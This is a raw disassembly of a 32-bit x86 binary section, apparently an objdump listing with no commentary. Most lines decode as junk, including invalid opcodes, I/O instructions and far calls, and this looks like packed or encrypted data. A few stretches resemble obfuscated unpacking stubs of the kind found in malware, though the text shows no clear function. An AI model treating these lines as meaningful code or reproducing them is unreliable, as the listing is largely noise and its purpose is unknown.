  40a5ce:	call   0xb5ad3c56
  40a5d3:	into   
  40a5d4:	push   ebx
  40a5d5:	adc    al,al
  40a5d7:	xchg   esp,eax
  40a5d8:	lahf   
  40a5d9:	std    
  40a5da:	jns    0x40a60e
  40a5dc:	and    edx,DWORD PTR [esi+0x4311dfa5]
  40a5e2:	adc    cl,BYTE PTR [esi+0x6]
  40a5e5:	mov    dh,0x46
  40a5e7:	aam    0x77
  40a5e9:	in     al,dx
  40a5ea:	shr    DWORD PTR [edi-0x65],1
  40a5ed:	dec    eax
  40a5ee:	js     0x40a66d
  40a5f0:	into   
  40a5f1:	mov    ds:0xfd4a7787,al
  40a5f6:	mov    eax,0x2271182
  40a5fb:	xchg   edx,eax
  40a5fc:	setbe  BYTE PTR [edi-0x110be909]
  40a603:	sub    eax,0x7067956d
  40a608:	sbb    DWORD PTR [bx-0x59fa],ebp
  40a60d:	sub    eax,0xd63d53cf
  40a612:	xchg   BYTE PTR [eax+0x1f34728f],bh
  40a618:	ss adc ebp,edx
  40a61b:	add    BYTE PTR [ebx+eiz*1+0x1a],ch
  40a61f:	je     0x40a5f5
  40a621:	dec    esi
  40a622:	jp     0x40a5ad
  40a624:	add    bh,bh
  40a626:	dec    edi
  40a627:	sbb    eax,ebp
  40a629:	xor    cl,BYTE PTR [ecx+0x43]
  40a62c:	jnp    0x40a662
  40a62e:	jg     0x40a5b0
  40a630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a631:	nop
  40a632:	imul   eax,DWORD PTR [edi-0x2d],0x112da29
  40a639:	ins    DWORD PTR es:[edi],dx
  40a63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a63b:	adc    DWORD PTR [ebp-0x27],esp
  40a63e:	pop    es
  40a63f:	sbb    BYTE PTR [ecx+0x3f],dh
  40a642:	dec    ecx
  40a643:	test   BYTE PTR [ebx-0x2260cc1e],dh
  40a649:	push   esi
  40a64a:	rcl    BYTE PTR [ecx+eiz*4],0x2f
  40a64e:	mov    eax,ds:0x2b39bdf0
  40a653:	aam    0xd6
  40a655:	or     eax,0x23edad62
  40a65a:	xchg   edx,eax
  40a65b:	adc    bh,BYTE PTR [esi]
  40a65d:	retf   
  40a65e:	xchg   esp,eax
  40a65f:	in     al,dx
  40a660:	xchg   esi,eax
  40a661:	aaa    
  40a662:	or     al,0x7
  40a664:	adc    DWORD PTR [ecx],edi
  40a666:	jo     0x40a636
  40a668:	leave  
  40a669:	pushf  
  40a66a:	dec    ecx
  40a66b:	jmp    0x74c9935c
  40a670:	sub    ch,bl
  40a672:	inc    edx
  40a673:	rcl    BYTE PTR [eax+0x562d8dce],1
  40a679:	das    
  40a67a:	xchg   ebp,eax
  40a67b:	add    BYTE PTR [eax],cl
  40a67d:	bound  edx,QWORD PTR [edi]
  40a67f:	inc    edx
  40a680:	mov    al,ds:0xb1054c1c
  40a685:	jl     0x40a6a8
  40a687:	sbb    al,0xf9
  40a689:	fld    DWORD PTR [esi-0x19]
  40a68c:	inc    ebx
  40a68d:	mov    esp,0x28e1ab4b
  40a692:	aaa    
  40a693:	mov    cl,0x84
  40a695:	cwde   
  40a696:	add    al,0x20
  40a698:	test   eax,0xfd330d98
  40a69d:	add    edx,DWORD PTR [ecx]
  40a69f:	mov    ?,WORD PTR [eax+ebx*4]
  40a6a2:	stc    
  40a6a3:	push   0xeec139ae
  40a6a8:	ret    0xf1bc
  40a6ab:	or     BYTE PTR [ecx+0x53],cl
  40a6ae:	inc    ecx
  40a6af:	add    BYTE PTR [ecx+0x5784c2fd],0xca
  40a6b6:	cld    
  40a6b7:	jo     0x40a738
  40a6b9:	fist   DWORD PTR [eax+0x4f61fb2d]
  40a6bf:	lea    edx,[esi]
  40a6c1:	or     BYTE PTR [ebx],ah
  40a6c3:	xchg   edi,eax
  40a6c4:	out    dx,al
  40a6c5:	pop    ebp
  40a6c6:	ror    BYTE PTR [eax-0x3a],cl
  40a6c9:	sbb    al,0xc1
  40a6cb:	inc    esp
  40a6cc:	ins    BYTE PTR es:[edi],dx
  40a6cd:	push   ebx
  40a6ce:	mov    ebx,0x2bfa2043
  40a6d3:	jle    0x40a731
  40a6d5:	jnp    0x40a6c9
  40a6d7:	jge    0x40a6ea
  40a6d9:	std    
  40a6da:	syscall 
  40a6dc:	inc    ebx
  40a6dd:	sub    bh,BYTE PTR [eax+0x62bdcf3e]
  40a6e3:	lahf   
  40a6e4:	push   cs
  40a6e5:	push   es
  40a6e6:	out    0xcc,al
  40a6e8:	mov    DWORD PTR [ebx+0x3b1f681e],edi
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x43366b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433657,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x5d61ec0c
  40a7ac:	xor    BYTE PTR [ebp+0x16],cl
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	ror    DWORD PTR [esp+edi*2],cl
  40a7b9:	call   FWORD PTR [ecx]
  40a7bb:	popa   
  40a7bc:	xchg   edx,eax
  40a7bd:	aaa    
  40a7be:	in     al,0x8d
  40a7c0:	cli    
  40a7c1:	dec    ecx
  40a7c2:	push   eax
  40a7c3:	and    eax,DWORD PTR [edi-0x53]
  40a7c6:	(bad)  
  40a7c7:	aaa    
  40a7c8:	jmp    0x40a7ed
  40a7ca:	pushf  
  40a7cb:	mov    eax,ds:0xa02fc268
  40a7d0:	sub    BYTE PTR [eax+0x4c],al
  40a7d3:	aaa    
  40a7d4:	sub    DWORD PTR [ebp-0x26],esp
  40a7d7:	dec    edi
  40a7d8:	mov    ah,0xb6
  40a7da:	shl    DWORD PTR [eax+0x20],cl
  40a7dd:	jb     0x40a7ab
  40a7df:	mov    ebp,0xf661409
  40a7e4:	jmp    0x40a792
  40a7e6:	shl    edx,cl
  40a7e8:	mov    dl,0xbd
  40a7ea:	mov    eax,ds:0xd28f0a52
  40a7ef:	and    BYTE PTR [edx],ch
  40a7f1:	outs   dx,DWORD PTR ds:[esi]
  40a7f2:	ffree  st(4)
  40a7f4:	ins    DWORD PTR es:[edi],dx
  40a7f5:	jp     0x40a7e5
  40a7f7:	mov    BYTE PTR [ecx-0x51bd1d31],bh
  40a7fd:	mov    bl,0x72
  40a7ff:	dec    edx
  40a800:	icebp  
  40a801:	lock call 0x1172:0xf3b528ce
  40a809:	mov    ch,0x71
  40a80b:	loopne 0x40a85a
  40a80d:	and    eax,0x54c4c272
  40a812:	pop    esi
  40a813:	lods   al,BYTE PTR ds:[esi]
  40a814:	nop
  40a815:	loopne 0x40a7df
  40a817:	lea    ecx,ds:0x594b239b
  40a81d:	stos   DWORD PTR es:[edi],eax
  40a81e:	cmp    BYTE PTR ds:0x94ec05fc,0xc9
  40a825:	add    eax,0x8729f61b
  40a82a:	stos   DWORD PTR es:[edi],eax
  40a82b:	cmc    
  40a82c:	jb     0x40a802
  40a82e:	scas   eax,DWORD PTR es:[edi]
  40a82f:	neg    DWORD PTR [edx-0x20]
  40a832:	mov    ebp,0xaef4a6b1
  40a837:	xchg   edi,eax
  40a838:	jl     0x40a80c
  40a83a:	and    dl,al
  40a83c:	cli    
  40a83d:	mov    edx,0x75b710d8
  40a842:	lods   eax,DWORD PTR ds:[esi]
  40a843:	mov    al,ds:0xd9081199
  40a848:	dec    ebp
  40a849:	mov    ds:0x656da5ea,al
  40a84e:	sbb    bl,al
  40a850:	inc    edx
  40a851:	mov    edx,0x3a482807
  40a856:	cdq    
  40a857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a858:	inc    edx
  40a859:	ret    0x5653
  40a85c:	ret    
  40a85d:	arpl   WORD PTR [eax-0x6452422e],bx
  40a863:	cs retf 
  40a865:	loope  0x40a877
  40a867:	mov    al,0x2e
  40a869:	gs rcr BYTE PTR es:[ecx],0x22
  40a86e:	shl    edi,cl
  40a870:	mov    esp,0xecf4f80b
  40a875:	push   edx
  40a876:	add    bl,BYTE PTR [ecx-0x40]
  40a879:	mov    ch,0x47
  40a87b:	or     esi,ecx
  40a87d:	adc    BYTE PTR [ebx+0x5b],ch
  40a880:	ds jge 0x40a8c1
  40a883:	push   cs
  40a884:	bound  esp,QWORD PTR [edi]
  40a886:	loope  0x40a8c8
  40a888:	lods   eax,DWORD PTR ds:[esi]
  40a889:	pop    edi
  40a88a:	int3   
  40a88b:	fimul  WORD PTR [eax-0x2d]
  40a88e:	jno    0x40a816
  40a890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a891:	sbb    DWORD PTR fs:[edx],edi
  40a894:	sbb    al,0x30
  40a896:	mov    edx,0x6fec24a2
  40a89b:	hlt    
  40a89c:	add    edi,DWORD PTR ds:0xd55e428a
  40a8a2:	xor    al,0xd
  40a8a4:	mov    bl,0x5
  40a8a6:	adc    al,cl
  40a8a8:	daa    
  40a8a9:	xchg   DWORD PTR ds:0x8c4a5fe6,edi
  40a8af:	ret    0x9458
  40a8b2:	add    esp,DWORD PTR [edi+0x35]
  40a8b5:	(bad)  
  40a8b7:	pushf  
  40a8b8:	int3   
  40a8b9:	xlat   BYTE PTR ds:[ebx]
  40a8ba:	aam    0x7b
  40a8bc:	inc    esi
  40a8bd:	inc    edx
  40a8be:	push   0xffffffe0
  40a8c0:	stos   DWORD PTR es:[edi],eax
  40a8c1:	idiv   DWORD PTR ds:0xc0465425
  40a8c7:	push   ecx
  40a8c8:	(bad)  
  40a8c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8ca:	(bad)  
  40a8cb:	cli    
  40a8cc:	sbb    al,0x8d
  40a8ce:	pop    esp
  40a8cf:	cmc    
  40a8d0:	bound  edx,QWORD PTR [eax+0x51]
  40a8d3:	enter  0x6970,0x7c
  40a8d7:	dec    edi
  40a8d8:	push   cs
  40a8d9:	into   
  40a8da:	dec    edi
  40a8db:	xlat   BYTE PTR ds:[ebx]
  40a8dc:	popa   
  40a8dd:	mov    cl,0xee
  40a8df:	xchg   edx,eax
  40a8e0:	cmp    eax,0xfacac4b9
  40a8e5:	mov    eax,0xbabe6f2
  40a8ea:	dec    ebp
  40a8eb:	call   0x9e332745
  40a8f0:	xchg   ebp,eax
  40a8f1:	push   0xffffffd6
  40a8f3:	mov    eax,ds:0x1a3dd3c6
  40a8f8:	push   esp
  40a8f9:	adc    al,cl
  40a8fb:	inc    esi
  40a8fc:	out    dx,al
  40a8fd:	adc    eax,0x322c4610
  40a902:	push   ecx
  40a903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a904:	pop    ds
  40a905:	nop
  40a906:	dec    ebp
  40a907:	pop    edi
  40a908:	aas    
  40a909:	xor    eax,0xff1a7780
  40a90e:	or     dl,al
  40a910:	sbb    cl,cl
  40a912:	(bad)
  40a916:	cmp    eax,0xf43d0ec
  40a91b:	mov    bh,0xa8
  40a91d:	mov    esp,0xbdedf184
  40a922:	or     al,BYTE PTR [edi+0x30b18592]
  40a928:	push   ebp
  40a929:	adc    BYTE PTR [ecx-0x10],ch
  40a92c:	and    eax,0x35ee382d
  40a931:	mov    ds:0x2ec7cdf7,eax
  40a936:	pop    eax
  40a937:	pop    edi
  40a938:	loop   0x40a8f2
  40a93a:	leave  
  40a93b:	ss push ds
  40a93d:	inc    esi
  40a93e:	les    ebx,FWORD PTR [esp+edx*8]
  40a941:	push   edx
  40a942:	jp     0x40a9a6
  40a944:	icebp  
  40a945:	(bad)  
  40a946:	repz sub eax,0x7afe994e
  40a94c:	lods   al,BYTE PTR ds:[esi]
  40a94d:	push   ds
  40a94e:	push   0x5b
  40a950:	mov    dh,0x70
  40a952:	cmp    al,0x9
  40a954:	lds    edx,FWORD PTR [edi+ebp*4+0x2593fb7c]
  40a95b:	arpl   WORD PTR [ecx-0x7f],cx
  40a95e:	test   al,0x66
  40a960:	cdq    
  40a961:	adc    eax,0xba0944c9
  40a966:	loopne 0x40a8ff
  40a968:	arpl   WORD PTR [eax],dx
  40a96a:	cs cmp al,0xf0
  40a96e:	hlt    
  40a96f:	scas   al,BYTE PTR es:[edi]
  40a970:	mov    cl,0x84
  40a972:	or     eax,0xb08db188
  40a977:	out    dx,eax
  40a978:	xchg   ebx,eax
  40a979:	cmp    esp,DWORD PTR [eax+0x352be23b]
  40a97f:	int3   
  40a980:	xchg   edi,eax
  40a981:	jmp    0xa64f2d4b
  40a986:	add    DWORD PTR ds:0xa8e,edx
  40a98b:	sbb    cl,0xbb
  40a98e:	inc    eax
  40a98f:	je     0x40a978
  40a991:	bound  eax,QWORD PTR [eax-0x51210377]
  40a997:	imul   ah
  40a999:	lods   eax,DWORD PTR ds:[esi]
  40a99a:	test   cl,cl
  40a99c:	imul   DWORD PTR [esi-0x5e8b8391]
  40a9a2:	xor    BYTE PTR [ebx],ah
  40a9a4:	add    DWORD PTR [ecx+0x53234365],0xfffffff3
  40a9ab:	ret    
  40a9ac:	mov    cl,0x7f
  40a9ae:	int3   
  40a9af:	clc    
  40a9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b1:	adc    al,0x90
  40a9b3:	add    eax,0xcc0a8c74
  40a9b8:	repz sub al,0x3f
  40a9bb:	jl     0x40a9b8
  40a9bd:	jb     0x40aa16
  40a9bf:	rol    DWORD PTR [esi+0x4c],1
  40a9c2:	pusha  
  40a9c3:	mov    WORD PTR [edi],ss
  40a9c5:	push   0x1bf8c9dc
  40a9ca:	sub    al,0x62
  40a9cc:	mov    ch,0x15
  40a9ce:	xor    ch,BYTE PTR [esp+ecx*2+0x645b8b54]
  40a9d5:	or     esi,edx
  40a9d7:	jecxz  0x40a9c4
  40a9d9:	clc    
  40a9da:	add    eax,0xc60055b2
  40a9df:	xchg   esi,eax
  40a9e0:	and    BYTE PTR [edx],bl
  40a9e2:	out    dx,al
  40a9e3:	in     eax,0xba
  40a9e5:	shrd   DWORD PTR [ebx],esp,0xf6
  40a9e9:	and    ecx,DWORD PTR [edi+0x6f4452d2]
  40a9ef:	mov    BYTE PTR [esi-0x708cfcad],ah
  40a9f5:	fisttp DWORD PTR [ebx+0x3e]
  40a9f8:	cmc    
  40a9f9:	popf   
  40a9fa:	std    
  40a9fb:	or     BYTE PTR [ecx+0x458bec45],0xfc
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	dec    esi
  40aa35:	adc    DWORD PTR [ebx+ebx*2+0x7e7eebd0],edi
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	dec    esp
  40aa41:	ret    
  40aa42:	(bad)  
  40aa44:	xor    al,0x94
  40aa46:	imul   edi,eax,0xdf3f9687
  40aa4c:	call   0x9ef6763a
  40aa51:	in     eax,0x3f
  40aa53:	arpl   WORD PTR [esi],di
  40aa55:	jnp    0x40aaa6
  40aa57:	fdivr  st,st(3)
  40aa59:	push   ebx
  40aa5a:	mov    ecx,0xfc7f3a9d
  40aa5f:	add    edx,esp
  40aa61:	pop    es
  40aa62:	push   esi
  40aa63:	pop    es
  40aa64:	cmp    DWORD PTR [edx+0x4],esp
  40aa67:	xlat   BYTE PTR fs:[ebx]
  40aa69:	std    
  40aa6a:	jmp    0x40aabf
  40aa6c:	js     0x40a9fe
  40aa6e:	adc    DWORD PTR [eax],eax
  40aa70:	daa    
  40aa71:	mov    bh,0xf8
  40aa73:	sbb    eax,DWORD PTR [ebx-0x32]
  40aa76:	stos   DWORD PTR es:[edi],eax
  40aa77:	and    eax,0x36199859
  40aa7c:	retf   
  40aa7d:	outs   dx,BYTE PTR ds:[esi]
  40aa7e:	push   cs
  40aa7f:	ret    0x652f
  40aa82:	out    dx,al
  40aa83:	add    al,0x61
  40aa85:	inc    edx
  40aa86:	retf   0xda14
  40aa89:	jmp    0x1e84:0x9bb1c7cf
  40aa90:	add    al,BYTE PTR [ebx+0x7cbf43b4]
  40aa96:	or     bl,BYTE PTR [edx+edx*1-0x7c6b7f1c]
  40aa9d:	add    esp,DWORD PTR ds:0x486ba86c
  40aaa3:	lods   eax,DWORD PTR ds:[esi]
  40aaa4:	lods   al,BYTE PTR ds:[esi]
  40aaa5:	int    0x62
  40aaa7:	and    al,0xd4
  40aaa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaaa:	adc    cl,BYTE PTR [ebx+0x1d]
  40aaad:	push   cs
  40aaae:	sbb    BYTE PTR [edi],cl
  40aab0:	adc    dh,BYTE PTR [ecx+0x5406997f]
  40aab6:	jg     0x40aaaf
  40aab8:	loop   0x40aa58
  40aaba:	rcr    BYTE PTR [esp+eax*4+0x2a],1
  40aabe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aabf:	add    DWORD PTR [ecx+eiz*8+0x30076399],edx
  40aac6:	xchg   edx,eax
  40aac7:	pop    es
  40aac8:	jnp    0x40aa52
  40aaca:	addr16 cmp esi,esp
  40aacd:	(bad)  
  40aace:	outs   dx,DWORD PTR ds:[esi]
  40aacf:	hlt    
  40aad0:	test   BYTE PTR [edx-0x29],dl
  40aad3:	mov    dl,0x36
  40aad5:	bnd ret 0x8c5a
  40aad9:	in     eax,0x55
  40aadb:	and    eax,0xea3538da
  40aae0:	jo     0x40aafb
  40aae2:	jnp    0x40ab19
  40aae4:	inc    esi
  40aae5:	addr16 jae 0x40ab4a
  40aae8:	out    dx,al
  40aae9:	sahf   
  40aaea:	pusha  
  40aaeb:	shr    DWORD PTR [ebx+0x4cd4231d],0x7
  40aaf2:	sub    BYTE PTR [ecx+0x15],dl
  40aaf5:	out    dx,eax
  40aaf6:	test   BYTE PTR [ecx-0x7293e836],dl
  40aafc:	push   0xfffffffd
  40aafe:	jle    0x40ab57
  40ab00:	push   ds
  40ab01:	mov    ds:0x6aa2a45d,al
  40ab06:	mov    ds:0x1a2813a7,eax
  40ab0b:	daa    
  40ab0c:	pop    edx
  40ab0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab0f:	xchg   ebx,eax
  40ab10:	mov    BYTE PTR [ebx+0x75e8cec0],bl
  40ab16:	jecxz  0x40ab65
  40ab18:	fcom   DWORD PTR [eax+edx*8-0x168bbb54]
  40ab1f:	stos   DWORD PTR es:[edi],eax
  40ab20:	(bad)  
  40ab22:	mov    bl,0xaa
  40ab24:	mov    al,ds:0xa3a9dbc2
  40ab29:	inc    eax
  40ab2a:	aad    0x68
  40ab2c:	sbb    dl,BYTE PTR [esi]
  40ab2e:	std    
  40ab2f:	inc    ecx
  40ab30:	out    dx,al
  40ab31:	fsin   
  40ab33:	cwde   
  40ab34:	mov    bl,0x10
  40ab36:	int3   
  40ab37:	mov    ebp,0xda2bb261
  40ab3c:	(bad)  
  40ab3d:	mov    esp,0x2a5ac93e
  40ab42:	scas   eax,DWORD PTR es:[edi]
  40ab43:	sti    
  40ab44:	mov    WORD PTR [eax],gs
  40ab46:	pop    ecx
  40ab47:	outs   dx,BYTE PTR ds:[esi]
  40ab48:	aas    
  40ab49:	mov    BYTE PTR [esi],bl
  40ab4b:	and    al,0x87
  40ab4d:	add    eax,0xf6a0366e
  40ab52:	jl     0x40abcf
  40ab54:	stc    
  40ab55:	jbe    0x40ab80
  40ab57:	ss dec ecx
  40ab59:	adc    ecx,DWORD PTR [ebx+0x70dd00a8]
  40ab5f:	dec    esp
  40ab60:	and    DWORD PTR [ebx+ecx*1],edx
  40ab63:	rcr    esp,0x22
  40ab66:	inc    ebp
  40ab67:	jge    0x40ab70
  40ab69:	sbb    edx,DWORD PTR [edx+0x24d0dfb2]
  40ab6f:	clc    
  40ab70:	mov    ebp,0x66c1aa75
  40ab75:	sbb    edx,eax
  40ab77:	(bad)
  40ab7b:	pop    es
  40ab7c:	stos   DWORD PTR es:[edi],eax
  40ab7d:	jae    0x40ab62
  40ab7f:	dec    eax
  40ab80:	das    
  40ab81:	shl    DWORD PTR [esi],cl
  40ab83:	repnz mov bh,0x81
  40ab86:	push   0xc8c83eab
  40ab8b:	loop   0x40ab43
  40ab8d:	or     eax,0x65b24647
  40ab92:	repz push esp
  40ab94:	adc    BYTE PTR [edi-0x3e],cl
  40ab97:	loope  0x40ab4c
  40ab99:	outs   dx,BYTE PTR ds:[esi]
  40ab9a:	add    eax,0x9500edca
  40ab9f:	push   edx
  40aba0:	inc    eax
  40aba1:	inc    ebx
  40aba2:	clc    
  40aba3:	les    esi,FWORD PTR [ecx+edi*2+0x3f]
  40aba7:	jae    0x40abc2
  40aba9:	dec    esi
  40abaa:	xchg   DWORD PTR [ebx],ebp
  40abac:	mul    DWORD PTR [edi]
  40abae:	ret    
  40abaf:	push   0x4187eff7
  40abb4:	ffree  st(1)
  40abb6:	push   ecx
  40abb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb8:	adc    ch,bh
  40abba:	cdq    
  40abbb:	sub    bh,BYTE PTR [esp+ebp*8]
  40abbe:	mov    dl,0x40
  40abc0:	mov    ds:0xfa44bd64,eax
  40abc5:	sub    ebx,DWORD PTR [esi-0x39f6b338]
  40abcb:	mov    ch,0xc3
  40abcd:	add    ecx,DWORD PTR [ebx+0x6d]
  40abd0:	outs   dx,DWORD PTR ds:[esi]
  40abd1:	pop    ebp
  40abd2:	es ss sub eax,0xe840dc6f
  40abd9:	pop    edx
  40abda:	cmp    dl,BYTE PTR [esp+edx*4-0x4d]
  40abde:	rol    dl,cl
  40abe0:	or     ah,dh
  40abe2:	mov    cl,0xc3
  40abe4:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40abe6:	push   ds
  40abe7:	push   es
  40abe8:	cwde   
  40abe9:	in     al,dx
  40abea:	bound  edx,QWORD PTR [esi-0x2d]
  40abed:	inc    edx
  40abee:	push   ebp
  40abef:	ins    BYTE PTR es:[edi],dx
  40abf0:	dec    edx
  40abf1:	pop    edi
  40abf2:	nop
  40abf3:	bound  esp,QWORD PTR [esi+0x6a]
  40abf6:	adc    al,0xe6
  40abf8:	pop    esi
  40abf9:	xchg   ebx,eax
  40abfa:	jle    0x40ab83
  40abfc:	add    al,bh
  40abfe:	add    DWORD PTR [ebp-0x44],0x8b302197
  40ac05:	mov    esp,0x8b1f96c8
  40ac0a:	sbb    dl,bh
  40ac0c:	sub    eax,0x9e0b317d
  40ac11:	mov    BYTE PTR [ebp+0x1f11b148],dl
  40ac17:	sar    BYTE PTR [esi],cl
  40ac19:	push   cs
  40ac1a:	rcr    BYTE PTR [ecx],cl
  40ac1c:	and    eax,0x56871622
  40ac21:	push   ds
  40ac22:	test   BYTE PTR [esi-0x67],dh
  40ac25:	sub    DWORD PTR [edx],0xffffffcf
  40ac28:	shl    DWORD PTR [edx],cl
  40ac2a:	retf   0xad7a
  40ac2d:	and    BYTE PTR [ecx],0x3a
  40ac30:	mov    al,0xc3
  40ac32:	(bad)  
  40ac33:	mov    bh,0x40
  40ac35:	cmp    ebp,DWORD PTR [ecx]
  40ac37:	les    esp,FWORD PTR [edi+0x3d1611ee]
  40ac3d:	bound  edi,QWORD PTR [edx]
  40ac3f:	test   DWORD PTR [edi+0x2b],edx
  40ac42:	jo     0x40ac74
  40ac44:	(bad)  
  40ac45:	comiss xmm1,DWORD PTR [ecx]
  40ac48:	pop    edi
  40ac49:	dec    edx
  40ac4a:	xor    dh,BYTE PTR [edx+0x20857bb7]
  40ac50:	push   ebx
  40ac51:	or     eax,0xff6a1e1a
  40ac56:	ins    DWORD PTR es:[edi],dx
  40ac57:	add    eax,DWORD PTR [edx+0x401273ea]
  40ac5d:	call   0x3efb:0xaf4c07e4
  40ac64:	sbb    BYTE PTR [edx],0x20
  40ac67:	jnp    0x40acd4
  40ac69:	push   0x4b
  40ac6b:	inc    esi
  40ac6c:	jp     0x40ac3d
  40ac6e:	nop
  40ac6f:	cmp    eax,0x965f6aed
  40ac74:	repz mov dl,0x52
  40ac77:	adc    eax,0x1eb9d068
  40ac7c:	cmp    cl,BYTE PTR [ebp+0x43e5638e]
  40ac82:	clc    
  40ac83:	cmp    ebx,DWORD PTR [ecx+0xfc83be3]
  40ac89:	test   BYTE PTR [edi+0xd],bl
  40ac8c:	add    BYTE PTR [eax],al
  40ac8e:	sbb    DWORD PTR ds:0x43366b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4336ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x799a8816],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad88
  40ad2c:	cs pop ebx
  40ad2e:	call   0x1627e56b
  40ad33:	or     al,0x1d
  40ad35:	xchg   ebx,eax
  40ad36:	sti    
  40ad37:	and    ebx,edx
  40ad39:	inc    ecx
  40ad3a:	xchg   esi,eax
  40ad3b:	push   ebp
  40ad3c:	dec    eax
  40ad3d:	loop   0x40adbe
  40ad3f:	mov    ds:0x12c4ed10,eax
  40ad44:	ret    0x25fc
  40ad47:	bound  esi,QWORD PTR [eax+0x6]
  40ad4a:	mov    BYTE PTR [edi-0x3b],ah
  40ad4d:	into   
  40ad4e:	pop    ebx
  40ad4f:	mov    al,0xdc
  40ad51:	adc    bh,BYTE PTR [edx+0x2b]
  40ad54:	and    ecx,eax
  40ad56:	and    eax,0x8f53ebf
  40ad5b:	sar    BYTE PTR [ecx+0x27],0x15
  40ad5f:	ror    BYTE PTR [edi],1
  40ad61:	(bad)  
  40ad62:	std    
  40ad63:	fidivr WORD PTR [esp+eax*8+0x7d]
  40ad67:	and    eax,0xf4b5236d
  40ad6c:	xor    esp,DWORD PTR [ecx]
  40ad6e:	inc    esp
  40ad6f:	popf   
  40ad70:	out    0x6c,al
  40ad72:	pop    eax
  40ad73:	shl    DWORD PTR [ecx+eiz*2+0x4a],1
  40ad77:	les    edx,FWORD PTR [eax+0x5798571d]
  40ad7d:	cmc    
  40ad7e:	or     ebx,DWORD PTR [esi-0x7c]
  40ad81:	xor    BYTE PTR [ebp-0x6a],bh
  40ad84:	dec    esp
  40ad85:	cmp    bl,BYTE PTR [esi-0x33]
  40ad88:	cmp    eax,0xad94695d
  40ad8d:	inc    ebp
  40ad8e:	mov    eax,ds:0x8c8ed1ae
  40ad93:	aas    
  40ad94:	mov    dh,BYTE PTR [eax]
  40ad96:	das    
  40ad97:	mov    ?,WORD PTR [ebp+0x3dc5fded]
  40ad9d:	mov    ecx,0x8b757a2a
  40ada2:	mov    edi,0xd2719807
  40ada7:	xor    bl,ah
  40ada9:	and    eax,0x73ea3c9f
  40adae:	inc    esp
  40adaf:	push   eax
  40adb0:	stos   DWORD PTR es:[edi],eax
